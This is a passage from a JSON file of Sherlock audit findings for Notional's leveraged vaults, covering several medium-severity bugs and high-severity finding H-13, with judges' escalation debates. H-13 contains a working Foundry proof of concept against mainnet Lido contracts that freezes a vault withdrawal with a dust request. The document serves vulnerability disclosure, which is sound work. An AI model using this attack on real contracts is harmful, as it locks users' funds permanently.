@brakeless-wtp are there any duplicates?",
      "summary": "\nThe report highlights a potential vulnerability in a protocol related to transfer errors. The protocol does not perform a code length check, which could lead to denial of service attacks and loss of assets. The vulnerability was found by a user named xiaoming90 and it could affect critical features such as deposit, redemption, and liquidation. The vulnerability can be mitigated by implementing changes to the code and ensuring that transfer errors do not revert the entire transaction. The severity of the issue is classified as Medium and it was discovered through manual review. The sponsors have acknowledged the issue and are planning to resolve it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/73",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "35130",
      "title": "M-4: `rescueTokens` feature is broken",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/72 \n\n## Found by \nxiaoming90\n## Summary\n\nThe rescue function is broken, and tokens cannot be rescued when needed, leading to assets being stuck in the contract.\n\n## Vulnerability Detail\n\nThe `ClonedCoolDownHolder` contains a feature that allows the protocol to recover lost tokens, as per the comment in Line 22 below. This function is guarded by the `onlyVault` modifier. Thus, only the vault can call this function.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/ClonedCoolDownHolder.sol#L23\n\n```solidity\nFile: ClonedCoolDownHolder.sol\n22:     /// @notice If anything ever goes wrong, allows the vault to recover lost tokens.\n23:     function rescueTokens(IERC20 token, address receiver, uint256 amount) external onlyVault {\n24:        token.checkTransfer(receiver, amount);\n25:     }\n26: \n```\n\nHowever, it was found that none of the vaults could call the `rescueTokens` function. Thus, this feature is broken.\n\n## Impact\n\nMedium. The rescue function is broken, and tokens cannot be rescued when needed, leading to assets being stuck in the contract.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/ClonedCoolDownHolder.sol#L23\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider allowing the protocol admin to call the `rescueTokens` function directly, or update the implementation of vaults to allow the vault to call the `rescueTokens` function.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  Lacks proof to substantiate the bug\n\n\n\n**xiaoming9090**\n\nEscalate.\n\nThis should be a valid issue. From the codebase, one can already see that the rescue function is broken. Since the rescue function is broken, if the protocol wants to rescue some tokens, it would not be able to, leading to a loss of assets.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> This should be a valid issue. From the codebase, one can already see that the rescue function is broken. Since the rescue function is broken, if the protocol wants to rescue some tokens, it would not be able to, leading to a loss of assets.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**lemonmon1984**\n\nThis issue should be valid. Due to the lack of implementation, it's challenging to provide a proof of concept, but the issue is clear from the codebase.\nAdditionally, GitHub issue #100 reports the same problem and should be duped into this one.\n\n**mystery0x**\n\n> Escalate.\n> \n> This should be a valid issue. From the codebase, one can already see that the rescue function is broken. Since the rescue function is broken, if the protocol wants to rescue some tokens, it would not be able to, leading to a loss of assets.\n\nWill have the sponsors look into this finding. But it seems to me this function belongs to an abstract contract that's meant to be inherited by contracts needing to use it as determined by the protocol. For example, it's being inherited by Kelp.sol for whoever `_vault` to use it:\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L52-L55\n\n```\ncontract KelpCooldownHolder is ClonedCoolDownHolder {\n    bool public triggered = false;\n\n    constructor(address _vault) ClonedCoolDownHolder(_vault) { }\n```\nAdditionally, finding of this nature is rated low given that it's optionally needed. Also, all vaults are deemed out of scope for this contest, and hence should be informational IMO.\n\n**WangSecurity**\n\n> Also, all vaults are deemed out of scope for this contest\n\nAs I see not all vaults are OOS:\n1. BaseStakingVault.sol\n2. PendlePTEtherFiVault.sol\n3. PendlePTKelpVault.sol\n4. PendlePTStakedUSDeVault.sol\n\nHence, I would agree this report identifies an issue that breaks core contract functionality leading to a loss of funds. Planning to accept the escalation and validate with medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/72/#issuecomment-2227180184): accepted\n\n**WangSecurity**\n\n@mystery0x I see that 100 is a duplicate, are there other duplicates?\n\n**mystery0x**\n\n> Lacks proof to substantiate the bug\n\nNope. #72 and #100 are the only two reports submitting this finding.\n\n**lemonmon1984**\n\n@mystery0x the labels on #100 hasn't been updated yet.",
      "summary": "\nThe `rescueTokens` feature in the `ClonedCoolDownHolder` contract is broken, preventing the protocol from recovering lost tokens. This can lead to assets being stuck in the contract. The issue was found by a user named xiaoming90 and was reported on GitHub. The vulnerability is rated as medium and was found through a manual review. The recommendation is to allow the protocol admin to call the function directly or update the implementation of vaults. The issue has been escalated and is currently being resolved. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/72",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "35129",
      "title": "M-3: Premature collateralization check in the `BaseStakingVault.initiateWithdraw()` function can leave accounts undercollateralized",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/56 \n\n## Found by \neeyore\n## Summary\n\nThe collateralization check is currently performed before the user action that impacts the account's collateralization.\n\n## Vulnerability Detail\n\nThe `initiateWithdraw()` function can affect the solvency of the account. During this process, tokens may be unwrapped and new tokens pushed into the withdrawal queue, altering the underlying tokens for which collateralization was initially checked. This can result in a different collateralization level than initially assessed.\n\nAdditionally, this contradicts how Notional core contracts perform such checks, where they are always conducted as the final step in any user interaction.\n\n## Impact\n\nThe account may become undercollateralized or insolvent following the user action.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/BaseStakingVault.sol#L250-L255\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nPerform the account collateralization check after the `_initiateWithdraw()` function call:\n\n```diff\nfunction initiateWithdraw() external {\n+       _initiateWithdraw({account: msg.sender, isForced: false});\n\n        (VaultAccountHealthFactors memory health, /* */, /* */) = NOTIONAL.getVaultAccountHealthFactors(\n            msg.sender, address(this)\n        );\n        VaultConfig memory config = NOTIONAL.getVaultConfig(address(this));\n        // Require that the account is collateralized\n        require(config.minCollateralRatio <= health.collateralRatio, \"Insufficient Collateral\");\n\n-       _initiateWithdraw({account: msg.sender, isForced: false});\n    }\n}\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  Lacks proof to substantiate the bug on an intended design\n\n**Hash01011122** commented:\n> Invalid, If this were to occur it would be admin error to add any other underlying asset\n\n\n\n**T-Woodward**\n\nI think this is a valid finding. Medium is a reasonable severity imo.\n\n@jeffywu this reinforces the need to value withdraw requests as if they were still the staked asset except in the very strict case where we know exactly what we will get upon unstaking and exactly when we will get it\n\n**0xklapouchy**\n\n@mystery0x \n\nTo simplify the issue described, let's illustrate it using the `PendlePTKelpVault`. \n\nBefore initiating a withdrawal, the vault shares' value is calculated based on the rsETH/WETH price. After a withdrawal request, the calculation is based on the stETH/WETH price.\n\nIn a situation where, for some reason, the stETH price drops compared to rsETH, the user's shares' value will also drop after initiating the withdrawal request, leading to the position becoming unhealthy for both the user and the protocol. \n\nIn such a case, it is better to block the initiation of the withdrawal. The better operation for the user or the Notional protocol in such cases is to close the position via `_executeInstantRedemption()`, which will redeem rsETH to WETH via TRADING_MODULE at a better price.\n\n**0xklapouchy**\n\nEscalate.\n\nThis is a valid medium issue.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> This is a valid medium issue.\n\nThe escalation could not be created because you are not exceeding the escalation threshold.\n\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page,\nin the [Sherlock webapp](https://app.sherlock.xyz/audits/).\n\n\n**xiaoming9090**\n\nEscalate.\n\nEscalating this issue on behalf of the submitter. Please review the above comments. Thanks.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> Escalating this issue on behalf of the submitter. Please review the above comments. Thanks.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**WangSecurity**\n\nAgree with the escalation, planning to accept it and validate with medium severity. @mystery0x are there additional duplicates?\n\n**brakeless-wtp**\n\nI believe it is unique.\n\n**WangSecurity**\n\nResult:\nMedium\nUnique \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/56/#issuecomment-2227213410): accepted",
      "summary": "\nThe issue reported is that the collateralization check in the `BaseStakingVault.initiateWithdraw()` function is being performed before the user action that affects the account's collateralization. This can lead to the account becoming undercollateralized or insolvent. The vulnerability was found by a user named eeyore and was identified through a manual review. The recommendation is to perform the collateralization check after the user action. There was some discussion among the judges about the validity and severity of the issue, but it was ultimately escalated and resolved as a medium severity issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/56",
      "tags": [],
      "finders": [
        "eeyore"
      ]
    },
    {
      "id": "35128",
      "title": "M-2: After a liquidator liquidates someone else’s position, it could cause a Denial of Service (DoS) when their own position also needs to be liquidated.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/44 \n\n## Found by \nZeroTrust\n\n## Summary\nAfter a liquidator liquidates someone else’s position, it could cause a Denial of Service (DoS) when their own position also needs to be liquidated.\n## Vulnerability Detail\n```javascript\n function _splitWithdrawRequest(address _from, address _to, uint256 vaultShares) internal {\n        WithdrawRequest storage w = VaultStorage.getAccountWithdrawRequest()[_from];\n        if (w.requestId == 0) return;\n\n        // Create a new split withdraw request\n        if (!w.hasSplit) {\n            SplitWithdrawRequest memory s = VaultStorage.getSplitWithdrawRequest()[w.requestId];\n            // Safety check to ensure that the split withdraw request is not active, split withdraw\n            // requests are never deleted. This presumes that all withdraw request ids are unique.\n            require(s.finalized == false && s.totalVaultShares == 0);\n            VaultStorage.getSplitWithdrawRequest()[w.requestId].totalVaultShares = w.vaultShares;\n        }\n\n        if (w.vaultShares == vaultShares) {\n            // If the resulting vault shares is zero, then delete the request. The _from account's\n            // withdraw request is fully transferred to _to\n            delete VaultStorage.getAccountWithdrawRequest()[_from];\n        } else {\n            // Otherwise deduct the vault shares\n@>>            w.vaultShares = w.vaultShares - vaultShares;\n            w.hasSplit = true;\n        }\n\n        // Ensure that no withdraw request gets overridden, the _to account always receives their withdraw\n        // request in the account withdraw slot.\n        WithdrawRequest storage toWithdraw = VaultStorage.getAccountWithdrawRequest()[_to];\n        require(toWithdraw.requestId == 0 || toWithdraw.requestId == w.requestId , \"Existing Request\");\n\n        // Either the request gets set or it gets incremented here.\n         toWithdraw.requestId = w.requestId;\n        toWithdraw.vaultShares = toWithdraw.vaultShares + vaultShares;\n        toWithdraw.hasSplit = true;\n    }\n```\nHere is an assumption: the requested withdrawal vaultShares are always greater than or equal to vaultSharesFromLiquidation. This assumption holds true for regular users because the requested withdrawal vaultShares represent the user’s entire vaultShares. However, this assumption does not hold for liquidators.\nPOC：\nThe liquidator：vaultShares 10e8\nA user need to be liquidated:  vaultShares 1e8,  withdrawRequest.vaultShares 1e8\nthe vaultSharesFromLiquidation is 1e8.\n- After liquidation:\nThe liquidator：vaultShares 11e8, withdrawRequest.vaultShares 1e8\n- After sometime,The liquidator’s position need to be liquidated\nthe vaultSharesFromLiquidation is 2e8.\nThen `w.vaultShares = w.vaultShares - vaultShares;` will revert()\nThis results in the liquidator’s position not being liquidated, leading to a loss of funds for the protocol.\n## Impact\nThis results in the liquidator’s position not being liquidated, leading to a loss of funds for the protocol.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L205\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider the case where w.vaultShares is less than vaultShares.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  w.vaultShares = w.vaultShares - vaultShares would just revert\n\n\n\n**0502lian**\n\nEscalate\nThis should be considered a valid issue.\nThe report points out the specific error, the conditions under which it occurs, and the impact it has when it does.\n\n**sherlock-admin3**\n\n> Escalate\n> This should be considered a valid issue.\n> The report points out the specific error, the conditions under which it occurs, and the impact it has when it does.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\n> Escalate This should be considered a valid issue. The report points out the specific error, the conditions under which it occurs, and the impact it has when it does.\n\nIt's intended to deny the call if w.vaultShares < vaultShares. What's your suggested mitigation?\n\n**0502lian**\n\n> > Escalate This should be considered a valid issue. The report points out the specific error, the conditions under which it occurs, and the impact it has when it does.\n> \n> It's intended to deny the call if w.vaultShares < vaultShares. What's your suggested mitigation?\n\nThe Dev team did not consider the scenario where w.vaultShares < vaultShares, which is very likely to occur. It has been confirmed with the sponsor that anyone can be a liquidator.\n\n![1721009924966](https://github.com/user-attachments/assets/48caaf1b-3cbb-4da6-b170-3fd70331c0dc)\n\n**As long as the liquidator has their own position and liquidates someone else’s position, this scenario will occur.**\n\nAfter this scenario occurs, the Dev team needs to consider more handling logic, which might not be solvable with just a few lines of code. So I currently don’t have a particularly good suggested mitigation\n\n**WangSecurity**\n\nPlease elaborate on how this can occur:\n\n> After sometime,The liquidator’s position need to be liquidated\nthe vaultSharesFromLiquidation is 2e8.\nThen w.vaultShares = w.vaultShares - vaultShares; will revert()\nThis results in the liquidator’s position not being liquidated, leading to a loss of funds for the protocol\n\nthe `vaultShares` is input data, so how this situation may occur, the report just says it happens, without a sufficient explanation it is indeed possible.\n\n**0502lian**\n\n> Please elaborate on how this can occur:\n> \n> > After sometime,The liquidator’s position need to be liquidated\n> > the vaultSharesFromLiquidation is 2e8.\n> > Then w.vaultShares = w.vaultShares - vaultShares; will revert()\n> > This results in the liquidator’s position not being liquidated, leading to a loss of funds for the protocol\n> \n> the `vaultShares` is input data, so how this situation may occur, the report just says it happens, without a sufficient explanation it is indeed possible.\n\n\nvaultShares is an input parameter for _splitWithdrawRequest, but it is not provided by the user. Instead, it is determined by the Notional protocol when the  position needs to be liquidated, deciding how many vaultShares need to be liquidated to return to a healthy state.\n\nIn fact, most of the time, the entire vaultShares of a position need to be liquidated, and w.vaultShares is always less than the entire vaultShares (for liquidator’s position)\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/BaseStakingVault.sol#L208\n\n\n**T-Woodward**\n\nI think this is a valid finding, although I would ask @jeffywu to confirm in case I am missing anything.\n\nThe watson is correct that we did not anticipate an account having more vaultShares than their withdrawal request. The code is designed such that accounts should either only have a withdrawal request or have no withdrawal request at all. And he is also correct that this situation could cause an inability to liquidate.\n\nHowever, I'm not sure this deserves a high severity. An account can't force their way into this situation. And I don't think the watson's assertion that \"this is very likely to occur\" is substantiated.\n\nFurthermore, even if they are in the situation where they have a withdrawal request + additional vaultShares I don't think there's any way that they can take advantage of it. Additional deposits will fail, and if they try to redeem the vault will only allow them to redeem their full withdraw request which would put them back in the situation they were in before they did the liquidation. \n\nSo there's no way that an account could borrow against their position and take cash out of the system knowing that they couldn't get liquidated. They would just kind of be stuck.\n\n**WangSecurity**\n\nThank you very much, with that I agree it's medium severity. The reason is that, firstly, the attacker cannot force them into this situation, secondly, there's not real benefit for them, except not being liqudiatable when they should.\n\nMoreover, as I understand, the regular user can end up in this situation, which would be problem for them, based on the comment above.\n\nPlanning to accept the escalation and validate with medium severity. @mystery0x @0502lian are there any additional duplicates?\n\n**brakeless-wtp**\n\nI believe it is unique. \n\n**WangSecurity**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0502lian](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/44/#issuecomment-2226689596): accepted",
      "summary": "\nThe bug report identifies an issue with the code where a liquidator may not be able to liquidate their own position after liquidating someone else's position. This could result in a loss of funds for the protocol. The report includes a code snippet and a proof of concept to demonstrate the issue. The report also includes a discussion among the judges and the development team, ultimately determining that the severity of the bug is medium and unique. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/44",
      "tags": [],
      "finders": [
        "ZeroTrust"
      ]
    },
    {
      "id": "35127",
      "title": "M-1: _claimRewardToken() will update accountRewardDebt even when there is a failure during reward claiming, as a result, a user might lose rewards.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/1 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nBiasedMerc, ZeroTrust, chaduke, eeyore, nirohgo, xiaoming90\n## Summary\n`` _claimRewardToken()`` will update accountRewardDebt even when there is a failure during reward claiming, for example, when there is a lack of balances or a temporary blacklist that prevents an account from receiving tokens for the moment. As a result, a user might lose rewards.\n\n## Vulnerability Detail\n\n_claimRewardToken() will be called when a user needs to claim rewards, for example, via \nclaimAccountRewards() -> _claimAccountRewards() -> _claimRewardToken().\n\nHowever, the problem is that `` _claimRewardToken()`` will update accountRewardDebt even when there is a failure during reward claiming, for example, when there is a lack of balances or a temporary blacklist that prevents an account from receiving tokens for the moment. \n\n[https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L295-L328](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L295-L328)\n\nThe following code will be executed to update ``accountRewardDebt``:\n\n```javascript\n VaultStorage.getAccountRewardDebt()[rewardToken][account] = (\n            (vaultSharesAfter * rewardsPerVaultShare) /\n                uint256(Constants.INTERNAL_TOKEN_PRECISION)\n        );\n```\n\nMeanwhile, the try-catch block will succeed without reverting even there is a failure: for example, when there is a lack of balances or a temporary blacklist that prevents an account from receiving tokens for the moment. \n\nAs a result, a user will lost rewards since  ``accountRewardDebt`` has been updated even though he has not received the rewards. \n\n## Impact\n _claimRewardToken() will update accountRewardDebt even when there is a failure during reward claiming, as a result, a user might lose rewards.\n\n\n## Code Snippet\n\n\n## Tool used\nManual reading and foundry\n\nManual Review\n\n## Recommendation\nWe should only update ``accountRewardDebt`` when the claim is successful. \n\n```diff\nfunction _claimRewardToken(\n        address rewardToken,\n        address account,\n        uint256 vaultSharesBefore,\n        uint256 vaultSharesAfter,\n        uint256 rewardsPerVaultShare\n    ) internal returns (uint256 rewardToClaim) {\n        rewardToClaim = _getRewardsToClaim(\n            rewardToken, account, vaultSharesBefore, rewardsPerVaultShare\n        );\n\n-        VaultStorage.getAccountRewardDebt()[rewardToken][account] = (\n-            (vaultSharesAfter * rewardsPerVaultShare) /\n-                uint256(Constants.INTERNAL_TOKEN_PRECISION)\n-        );\n\n        if (0 < rewardToClaim) {\n            // Ignore transfer errors here so that any strange failures here do not\n            // prevent normal vault operations from working. Failures may include a\n            // lack of balances or some sort of blacklist that prevents an account\n            // from receiving tokens.\n            try IEIP20NonStandard(rewardToken).transfer(account, rewardToClaim) {\n                bool success = TokenUtils.checkReturnCode();\n                if (success) {\n+                   VaultStorage.getAccountRewardDebt()[rewardToken][account] = (\n+                  (vaultSharesAfter * rewardsPerVaultShare) /\n+                  uint256(Constants.INTERNAL_TOKEN_PRECISION)\n+                  );\n                    emit VaultRewardTransfer(rewardToken, account, rewardToClaim);\n                } else {\n                    emit VaultRewardTransfer(rewardToken, account, 0);\n                }\n            // Emits zero tokens transferred if the transfer fails.\n            } catch {\n                emit VaultRewardTransfer(rewardToken, account, 0);\n            }\n        }\n    }\n```\n\n\n\n## Discussion\n\n**jeffywu**\n\nWhile this is a valid, it's not clear what an alternative behavior would be. In the event that the transfer fails, there is no clear path to getting the token accounting back to a proper amount. We also do not want to allow the transaction to revert or this would block liquidations from being processed.\n\nIn the case where token receivers are blacklisted, not receiving rewards is probably the least bad of all potential outcomes.",
      "summary": "\nThis bug report discusses a problem with the code that updates a user's reward balance when they claim their rewards. The issue is that the code will update the reward balance even if there is a failure during the claiming process, which can result in the user losing their rewards. This bug was found by a group of people and has been acknowledged by the protocol. The report includes details of the vulnerability, its impact, and a code snippet showing the problematic code. The recommendation is to only update the reward balance if the claim is successful. There is also a discussion about potential alternative behaviors and the potential consequences of the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/1",
      "tags": [],
      "finders": [
        "eeyore",
        "ZeroTrust",
        "xiaoming90",
        "chaduke",
        "BiasedMerc",
        "nirohgo"
      ]
    },
    {
      "id": "35126",
      "title": "H-13: `Kelp:_finalizeCooldown` cannot claim the withdrawal if adversary would requestWithdrawals with dust amount for the holder",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/105 \n\n## Found by \nBiasedMerc, lemonmon, xiaoming90\n## Summary\n\nIf an adversary calls `LidoWithdraw.requestWithdrawals` with some dust stETH amount and the `KelpCooldownHolder`'s address, the withdrawal will be locked. It cannot be rescued via `rescueTokens`, since it does not have to logic to `claimWithdrawal`, therefore the withdrawal will be locked permanently.\n\n## Vulnerability Detail\n\nThe `KelpCooldownHolder` is responsible to withdraw from rsETH to stETH via `WithdraManager`, and then withdraw stETH to ETH via `LidoWithdraw`. Since it is two step process, the `KelpCooldownHolder` implements `triggerExtraStep`. After the first withdrawal request is finalized, the `triggerExtraStep` should be called to initiate the second withdrawal request.\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83\n\nThe `KelpCooldownHolder._finalizeCooldown` will be called when the `exitVault` is called to finalize the process by `LidoWithdraw.claimWithdrawal` and send the claimed ETH back to the vault.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L100\n\nThis `KelpCooldownHolder._finalizeCooldown` is, however, hardcoded to claim the 0-th request from the `LidoWithdraw.getWithdrawalRequests`, thus  if there are more than 1 withdrawal requests for this `KelpCooldownHolder`, all the requests but the 0-th request will be ignored.\n\nAn adversary can abuse this fact by request withdrawal for the `KelpCooldownHolder` before the `triggerExtraStep` is called. In that case the real withdrawal request will not be the 0-th, and will be ignored. \n\nAfter the finalize on the dust withdrawal is done, the accountWithdrawRequest on the PendlePTKelpVault will be deleted and this `finalizeCooldown` on the holder cannot be called again since it has onlyVault modifier. The `rescueTokens` will not help, as the stETH is already transferred to LidoWithdraw.\n\n\n### PoC\n\nHere is a proof of concept demonstrating that a third party can call `LidoWithdrawals.requestWithdrawals`. And the requestId is in the order of request:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {IERC20} from \"@interfaces/IERC20.sol\";\n\ninterface ILidoWithdraw {\n    struct WithdrawalRequestStatus {\n        uint256 amountOfStETH;\n        uint256 amountOfShares;\n        address owner;\n        uint256 timestamp;\n        bool isFinalized;\n        bool isClaimed;\n    }\n\n    function requestWithdrawals(uint256[] memory _amounts, address _owner) external returns (uint256[] memory requestIds);\n    function getWithdrawalRequests(address _owner) external view returns (uint256[] memory requestsIds);\n    function getWithdrawalStatus(uint256[] memory _requestIds) external view returns (WithdrawalRequestStatus[] memory statuses);\n}\n\nIERC20 constant rsETH = IERC20(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7);\naddress constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;\nILidoWithdraw constant LidoWithdraw = ILidoWithdraw(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1);\n\n\ncontract KelpTestLido is Test {\n    address stETHWhale;\n    uint tokensClaimed;\n\n    function setUp() public {\n        stETHWhale = 0x804a7934bD8Cd166D35D8Fb5A1eb1035C8ee05ce;\n        tokensClaimed = 10e18;\n        vm.startPrank(stETHWhale);\n        IERC20(stETH).transfer(address(this), tokensClaimed);\n        vm.stopPrank();\n    }\n\n    function test_Lido_requestId() public {\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 100;\n        // Adversary calls requestWithdrawals for the holder with dust amount\n        vm.startPrank(stETHWhale);\n        IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);\n        LidoWithdraw.requestWithdrawals(amounts, address(this));\n        vm.stopPrank();\n\n        // The real withdrawal request is done after\n        amounts[0] = tokensClaimed;\n        IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);\n        uint256[] memory requestIds = LidoWithdraw.requestWithdrawals(amounts, address(this));\n        uint real_requestId = requestIds[0];\n        for(uint i=0; i< requestIds.length; i++) {\n          emit log_named_uint(\"request id for real withdrawal request\", requestIds[i]);\n        }\n\n        requestIds = LidoWithdraw.getWithdrawalRequests(address(this));\n        for(uint i=0; i< requestIds.length; i++) {\n          console.log(\"id for %s: %s\",i, requestIds[i]);\n        }\n\n        ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);\n        for(uint i=0; i< requestIds.length; i++) {\n          console.log(\"stETH amount for %s: %s\",i, withdrawsStatus[i].amountOfStETH);\n        }\n\n        require(real_requestId != requestIds[0]);\n    }\n}\n```\n\nThe Result is below: note that the 0-th request only has the dust amount of stETH request (100)\n\n```sh\n[PASS] test_Lido_requestId() (gas: 370501)\nLogs:\n  request id for real withdrawal request: 44537\n  id for 0: 44536\n  id for 1: 44537\n  stETH amount for 0: 100\n  stETH amount for 1: 10000000000000000000\n```\n\nThe addresses are taken from the mainnet, so should fork from the mainnet to test.\n\n## Impact\n\nA malicious actor can use dust amount of stETH to freeze withdrawal from the `KelpPTKelpVault`. The frozen withdrawal will be locked permanently,\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L100\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider claiming all the withdrawals from LidoWithdraw. However, an adversary can request withdrawals for the holder multiple times with dust stETH, attempting another DoS factor. Alternatively consider storing the requestId in the triggerExtraStep, and claim only the stored request in the finalize step.\n\n\n\n\n## Discussion\n\n**mystery0x**\n\nThe severity of this finding being medium is due to the fact it requires an externally malicious factor to incur the exploit. \n\n**xiaoming9090**\n\nEscalate\n\nThis issue should be High instead of Medium.\n\nAnyone can easily execute this attack by injecting malicious withdrawal requests into the withdrawal queue, causing harm to the victim. The attack could lead to the following impacts:\n- Loss of assets\n- Account's collateral to be undervalued, leading to unexpected liquidation\n\nRefer to my report for more details (https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/62)\n\nThe lead judge downgraded this issue from High to Medium based on the following rationale, which is incorrect:\n> The severity of this finding being medium is due to the fact it requires an externally malicious factor to incur the exploit\n\nAnyone can execute this attack anytime, so no externally malicious factor is required here.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This issue should be High instead of Medium.\n> \n> Anyone can easily execute this attack by injecting malicious withdrawal requests into the withdrawal queue, causing harm to the victim. The attack could lead to the following impacts:\n> - Loss of assets\n> - Account's collateral to be undervalued, leading to unexpected liquidation\n> \n> Refer to my report for more details (https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/62)\n> \n> The lead judge downgraded this issue from High to Medium based on the following rationale, which is incorrect:\n> > The severity of this finding being medium is due to the fact it requires an externally malicious factor to incur the exploit\n> \n> Anyone can execute this attack anytime, so no externally malicious factor is required here.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\nPlease see my comment on #62\n\n**WangSecurity**\n\nI agree with the escalation, I don't see any malicious factors that are needed here and the attack is easily repeatable. Even though the attacker 